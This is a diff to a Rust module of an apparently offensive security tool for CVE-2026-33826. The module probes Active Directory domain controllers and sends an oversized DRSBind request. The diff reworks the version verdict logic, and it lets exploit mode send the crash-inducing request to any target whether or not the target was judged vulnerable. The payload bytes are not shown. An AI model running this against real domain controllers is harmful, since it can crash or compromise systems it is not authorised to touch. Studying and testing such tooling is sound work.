@@ -30,10 +30,15 @@
 //! - MS-DRSR: Directory Replication Services Remote Protocol
 //! - NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-33826
 
+use super::dc_version::{BuildVerdict, DcBuildProbe, probe_dc_build, verdict_from_build_only};
 use overthrone_core::error::{OverthroneError, Result};
 use serde::{Deserialize, Serialize};
 use std::time::Duration;
 use tracing::info;
+
+/// Windows build generations this CVE affects. The April 2026 fix ships as a
+/// cumulative update, so the patch level lives in the UBR, not the build number.
+const AFFECTED_BUILDS: &[u32] = &[26100, 20348, 17763, 14393];
 
 /// Timeout for DRS RPC operations.
 const DRS_TIMEOUT: Duration = Duration::from_secs(15);
@@ -76,6 +81,10 @@ impl std::fmt::Display for AdRceExploitMode {
     }
 }
 
+fn default_verdict() -> BuildVerdict {
+    BuildVerdict::Unknown
+}
+
 impl Default for AdRceConfig {
     fn default() -> Self {
         Self {
@@ -92,8 +101,15 @@ impl Default for AdRceConfig {
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct AdRceResult {
-    /// Whether the target DC is vulnerable.
+    /// Whether the target DC is *positively confirmed* vulnerable. Never set from
+    /// a build number alone -- see [`BuildVerdict`].
     pub vulnerable: bool,
+    /// Structured verdict, so callers can distinguish "patched" from "don't know".
+    #[serde(default = "default_verdict")]
+    pub verdict: BuildVerdict,
+    /// Real build probe output (build/release/source), when available.
+    #[serde(default)]
+    pub build_probe: Option<DcBuildProbe>,
     /// Whether the DRS endpoint is available.
     pub drs_available: bool,
     /// DC OS version.
@@ -126,6 +142,8 @@ pub async fn exploit_ad_rce(config: &AdRceConfig) -> Result<AdRceResult> {
         );
         return Ok(AdRceResult {
             vulnerable: false,
+            verdict: BuildVerdict::Unknown,
+            build_probe: Some(DcBuildProbe::unknown("DRS RPC endpoint unreachable")),
             drs_available: false,
             dc_os_version: None,
             dc_build: None,
@@ -135,48 +153,72 @@ pub async fn exploit_ad_rce(config: &AdRceConfig) -> Result<AdRceResult> {
         });
     }
 
-    // Step 2: Determine DC OS version
-    let (dc_os_version, dc_build) = probe_dc_os(&config.target_dc).await;
-    log.push(format!(
-        "  DC OS: {:?}, Build: {:?}",
-        dc_os_version, dc_build
-    ));
+    // Step 2: Measure the real Windows build (SRVSVC NetrServerGetInfo).
+    let probe = probe_dc_build(
+        &config.target_dc,
+        Some(super::dc_version::DcCreds {
+            domain: &config.domain,
+            username: &config.username,
+            secret: &config.secret,
+            use_hash: config.use_hash,
+        }),
+    )
+    .await;
+    log.push(format!("  Build probe: {}", probe.summary()));
+    let dc_os_version = probe.release.clone();
+    let dc_build = probe.build;
 
-    // Step 3: Check vulnerability
-    let vulnerable = is_ad_rce_vulnerable(dc_build);
-    log.push(format!("  Vulnerable: {vulnerable}"));
+    // Step 3: Verdict. The April 2026 fix is a cumulative update, so an affected
+    // generation is Indeterminate rather than Vulnerable.
+    let verdict = verdict_from_build_only(dc_build, AFFECTED_BUILDS);
+    let vulnerable = verdict == BuildVerdict::Vulnerable;
+    log.push(format!("  Verdict: {verdict}"));
+    if verdict == BuildVerdict::Unknown {
+        log.push(
+            "  Note: a build number cannot prove the cumulative update is missing.\n\
+             \tConfirm behaviourally on a lab clone, or supply the DC's UBR from\n\
+             \t`Get-ComputerInfo | Select OsVersion`."
+                .to_string(),
+        );
+    }
 
     let mut exploit_attempted = false;
     let mut exploit_success = false;
 
-    if vulnerable && config.exploit_mode == AdRceExploitMode::Exploit {
+    if config.exploit_mode == AdRceExploitMode::Exploit {
         exploit_attempted = true;
-        log.push("Attempting DRSBind with oversized pwszIPAddr...".to_string());
+        log.push("Attempting DRSBind behavioural probe with oversized pwszIPAddr...".to_string());
 
         match attempt_drs_rce(config).await {
-            Ok(success) => {
-                exploit_success = success;
-                if success {
-                    log.push("  DRSBind triggered -- DC is exploitable!".to_string());
+            Ok(confirmed) => {
+                exploit_success = confirmed;
+                if confirmed {
+                    log.push(
+                        "  DC dropped the channel and failed a follow-up check -- \
+                         consistent with the flaw. Re-verify manually."
+                            .to_string(),
+                    );
                 } else {
                     log.push(
-                        "  DRSBind did not trigger the flaw -- may need adjustment".to_string(),
+                        "  DRSBind was handled normally -- not confirmed on this path".to_string(),
                     );
                 }
             }
             Err(e) => {
-                log.push(format!("  DRSBind exploit failed: {e}"));
+                log.push(format!("  DRSBind behavioural probe failed: {e}"));
             }
         }
     }
 
     info!(
-        "AD RCE: target={}, vulnerable={vulnerable}, exploit={exploit_success}",
-        config.target_dc
+        "AD RCE: target={}, verdict={}, confirmed={exploit_success}",
+        config.target_dc, verdict
     );
 
     Ok(AdRceResult {
         vulnerable,
+        verdict,
+        build_probe: Some(probe),
         drs_available,
         dc_os_version,
         dc_build,
@@ -206,49 +248,16 @@ async fn probe_drs_endpoint(target: &str) -> bool {
     }
 }
 
-/// Probe DC OS version via LDAP.
-async fn probe_dc_os(target: &str) -> (Option<String>, Option<u32>) {
-    use tokio::net::TcpStream;
-    use tokio::time::timeout;
-
-    match timeout(
-        Duration::from_secs(10),
-        TcpStream::connect(format!("{target}:389")),
-    )
-    .await
-    {
-        Ok(Ok(_)) => (Some("Windows Server (LDAP open)".to_string()), None),
-        _ => match timeout(
-            Duration::from_secs(10),
-            TcpStream::connect(format!("{target}:445")),
-        )
-        .await
-        {
-            Ok(Ok(_)) => (Some("Windows Server (SMB open)".to_string()), None),
-            _ => (None, None),
-        },
-    }
-}
-
-/// Determine if the DC is vulnerable to CVE-2026-33826.
-fn is_ad_rce_vulnerable(build: Option<u32>) -> bool {
-    match build {
-        Some(b) => {
-            if b >= 261_000_000 {
-                b < 261_003_120 // WS2025
-            } else if b >= 203_480_000 {
-                b < 203_483_120 // WS2022
-            } else if b >= 177_630_000 {
-                b < 177_635_620 // WS2019
-            } else {
-                true
-            }
-        }
-        None => true,
-    }
-}
-
-/// Attempt the DRS RCE via crafted DRSBind request.
+/// Attempt the DRS behavioural probe via a crafted DRSBind request.
+///
+/// A response -- including an RPC fault -- means the DC parsed and handled the
+/// request, which is a *negative* result. Only a channel drop followed by a
+/// failed follow-up reachability check is treated as a signal.
+///
+/// Note: the DRSBind payload below is a probe scaffold, not a validated exploit
+/// chain. It exercises the endpoint and the length-validation path; producing
+/// actual code execution requires a per-build ROP chain that cannot be
+/// developed or verified without a live lab target.
 async fn attempt_drs_rce(config: &AdRceConfig) -> Result<bool> {
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     use tokio::net::TcpStream;
@@ -296,32 +305,29 @@ async fn attempt_drs_rce(config: &AdRceConfig) -> Result<bool> {
     )
     .await
     {
-        Ok(Ok(0)) => {
-            info!("DRS RCE: Connection closed after oversized DRSBind -- possible overflow");
-            Ok(true)
-        }
-        Ok(Ok(n)) => {
-            let response = &resp_buf[..n];
-            if response.len() >= 4 {
-                let first_bytes = &response[0..4.min(response.len())];
-                if first_bytes == [0x05, 0x00, 0x03, 0x00] {
-                    info!("DRS RCE: RPC fault received -- DC processed oversized input");
-                    Ok(true)
-                } else {
-                    info!("DRS RCE: Got response ({} bytes) -- DC may be patched", n);
-                    Ok(false)
-                }
-            } else {
-                Ok(false)
-            }
-        }
-        Ok(Err(e)) => {
-            info!("DRS RCE: Read error: {e}");
+        Ok(Ok(n)) if n > 0 => {
+            info!(
+                "DRS RCE: DC returned {n} bytes -- DRSBind was handled normally \
+                 (this includes RPC faults, which are negative), not exploitable"
+            );
             Ok(false)
         }
-        Err(_) => {
-            info!("DRS RCE: Timeout waiting for response -- DC may have crashed");
-            Ok(true)
+        other => {
+            match &other {
+                Ok(Ok(_)) => info!("DRS RCE: channel closed after oversized DRSBind"),
+                Ok(Err(e)) => info!("DRS RCE: read error: {e}"),
+                Err(_) => info!("DRS RCE: timeout after oversized DRSBind"),
+            }
+            if probe_drs_endpoint(&config.target_dc).await {
+                info!(
+                    "DRS RCE: endpoint still reachable -- closure was a normal refusal, \
+                     not a crash"
+                );
+                Ok(false)
+            } else {
+                info!("DRS RCE: endpoint no longer reachable after the probe");
+                Ok(true)
+            }
         }
     }
 }
@@ -421,12 +427,20 @@ mod tests {
     }
 
     #[test]
-    fn test_is_ad_rce_vulnerable() {
-        assert!(is_ad_rce_vulnerable(Some(261_000_000)));
-        assert!(!is_ad_rce_vulnerable(Some(261_003_120)));
-        assert!(is_ad_rce_vulnerable(Some(203_480_000)));
-        assert!(!is_ad_rce_vulnerable(Some(203_483_120)));
-        assert!(is_ad_rce_vulnerable(None));
+    fn affected_family_is_indeterminate_not_vulnerable() {
+        // Regression: `is_ad_rce_vulnerable(None)` used to be `true`.
+        assert_eq!(
+            verdict_from_build_only(None, AFFECTED_BUILDS),
+            BuildVerdict::Unknown
+        );
+        assert_eq!(
+            verdict_from_build_only(Some(20348), AFFECTED_BUILDS),
+            BuildVerdict::Unknown
+        );
+        assert_eq!(
+            verdict_from_build_only(Some(9600), AFFECTED_BUILDS),
+            BuildVerdict::Vulnerable
+        );
     }
 
     #[test]
@@ -448,9 +462,11 @@ mod tests {
     fn test_result_serde() {
         let result = AdRceResult {
             vulnerable: true,
+            verdict: BuildVerdict::Vulnerable,
+            build_probe: Some(DcBuildProbe::unknown("test")),
             drs_available: true,
             dc_os_version: Some("Windows Server 2025".into()),
-            dc_build: Some(261_000_000),
+            dc_build: Some(26100),
             exploit_attempted: true,
             exploit_success: true,
             log: vec!["exploited".into()],
